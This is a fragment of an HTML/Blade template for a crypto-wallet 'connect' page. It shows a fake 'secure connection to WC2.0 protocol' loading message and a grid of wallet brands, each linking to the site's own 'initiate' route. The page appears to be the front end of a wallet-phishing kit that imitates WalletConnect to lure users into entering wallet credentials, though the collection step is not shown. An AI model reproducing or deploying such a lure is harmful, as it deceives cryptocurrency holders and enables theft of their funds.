...
<body data-new-gr-c-s-check-loaded="14.1156.0" data-gr-ext-installed="">
    <div id="preloader" class="preloader-hidden-x">
        ...
        <p style="margin: 10px 40px; margin-top: 30px;">Initiating secure connection to WC2.0 protocol<span
                id="dot-holder">...</span></p>
    </div>
    <div class="">
        <div class="" style="margin-top: 50px;">
            <a href="/"><img src="/app/imagess/wac-logo.png" class="img-fluid mx-auto d-block" width="200px"></a>
        </div>
        <div class="row">
            ...
            <div class="col-md-4">
                ...
                <div class="row holder">
                    <div class="col" style="margin: 0px; padding: 0px;">
                        <a href="{{ route('user.initiate.index') }}?wallet=TrustWallet">
                            <div class="item">
                                <img src="/app/imagess/tw.png" class="img-fluid mx-auto d-block" width="80px">
                                <h4>TrustWallet</h4>
                            </div>
                        </a>
                    </div>
                    <div class="col" style="margin: 0px; padding: 0px;">
                        <a href="{{ route('user.initiate.index') }}?wallet=MetaMask">
                            <div class="item">
                                <img src="/app/imagess/mm.png" class="img-fluid mx-auto d-block" width="80px">
                ...
                <div class="row holder">
                    <div class="col" style="margin: 0px; padding: 0px;">
                        <a href="{{ route('user.initiate.index') }}?wallet=Blockchain">
                            <div class="item">
                                <img src="/app/imagess/block.png" class="img-fluid mx-auto d-block" width="70px">
                                <h4 style="margin-top: 10px;">Blockchain</h4>
                            </div>
                        </a>
                    </div>
                    <div class="col" style="margin: 0px; padding: 0px;">
                        <a href="{{ route('user.initiate.index') }}?wallet=Safepal">
                            <div class="item">
                                <img src="/app/imagess/sfp.png" class="img-fluid mx-auto d-block" width="60px">
                ...
                <div class="row holder">
                    <div class="col" style="margin: 0px; padding: 0px;">
                        <a href="{{ route('user.initiate.index') }}?wallet=Trezor">
                            <div class="item">
                                <img src="/app/imagess/trz.png" class="img-fluid mx-auto d-block" width="80px">
                                <h4>Trezor</h4>
                            </div>
                        </a>
                    </div>
                    <div class="col" style="margin: 0px; padding: 0px;">
                        <a href="{{ route('user.initiate.index') }}?wallet=Exodus">
                            <div class="item">
                                <img src="/app/imagess/exd.svg" class="img-fluid mx-auto d-block" width="70px">
                ...
                <div class="row holder">
                    <div class="col" style="margin: 0px; padding: 0px;">
                        <a href="{{ route('user.initiate.index') }}?wallet=Coinbase">
                            <div class="item">
                                <img src="/app/imagess/cnb.svg" class="img-fluid mx-auto d-block" width="80px">
                                <h4>Coinbase</h4>
                            </div>
                        </a>
                    </div>
                    <div class="col" style="margin: 0px; padding: 0px;">
                        <a href="{{ route('user.initiate.index') }}?wallet=Cypto.com">
                            <div class="item">
                                <img src="/app/imagess/cry.png" class="img-fluid mx-auto d-block" width="70px">
                ...
                <div class="row holder">
                    <div class="col" style="margin: 0px; padding: 0px;">
                        <a href="{{ route('user.initiate.index') }}?wallet=LedgerNanoX">
                            <div class="item">
                                <img src="/app/imagess/ln.png" class="img-fluid mx-auto d-block" width="80px">
                                <h4 style="margin-top: 9px;">LedgerNanoX</h4>
                            </div>
                        </a>
                    </div>
                    <div class="col" style="margin: 0px; padding: 0px;">
                        <a href="{{ route('user.initiate.index') }}?wallet=Coinomi">
                            <div class="item">
                                <img src="/app/imagess/cn.jpg" class="img-fluid mx-auto d-block" width="80px">
                ...
                <div class="" style="margin: 10px 11%; margin-top: 20px; margin-bottom: 20px;">
                    ...
                    <div class="mt-4">
                        <button class="btn btn-block mt-2" onclick="window.location ='{{ route('user.dashboard') }}'; ">
